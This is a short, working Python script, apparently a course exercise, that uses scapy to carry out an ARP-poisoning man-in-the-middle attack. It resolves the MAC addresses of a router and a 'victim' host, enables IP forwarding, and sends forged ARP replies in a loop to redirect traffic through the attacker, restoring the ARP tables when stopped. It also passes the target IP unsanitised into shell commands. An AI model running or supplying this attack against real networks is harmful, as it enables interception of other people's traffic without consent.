#!/usr/bin/env python3

from scapy.all import *
import sys
import time

def getMACaddr(ip):
    os.popen("ping -c 1 %s" % ip)
    fields = os.popen('grep "%s " /proc/net/arp' % ip).read().split()
    if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
        return fields[3]
    else:
        print("no response from " + ip)

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

def main(argv):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")

    if len(argv) != 3:
        sys.exit("[!] Usage : python3 12-13.py [router ip] [target ip]")

    routerIP = argv[1]
    print ("routerIP : " + routerIP)
    victimIP = argv[2]
    print ("victimIP : " + victimIP)

    routerMAC = getMACaddr(routerIP)
    print ("routerMAC : " + str(routerMAC)) 
    victimMAC = getMACaddr(victimIP)
    print ("victimMAC : " + str(victimMAC))
    
    if routerMAC == None:
        sys.exit("Could not find router MAC address. Closing....")
    if victimMAC == None:
        sys.exit("Could not find victim MAC address. Closing....")

    with open("/proc/sys/net/ipv4/ip_forward", "w") as ipf:
        ipf.write("1\n")
    
    try:
        while True:
            poison(routerIP, victimIP, routerMAC, victimMAC)
            time.sleep(1.5)
                                        
    except KeyboardInterrupt:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as ipf:
            ipf.write("0\n")
        restore(routerIP, victimIP, routerMAC, victimMAC)
        sys.exit("closing...")

if __name__ == "__main__":
    main(sys.argv)
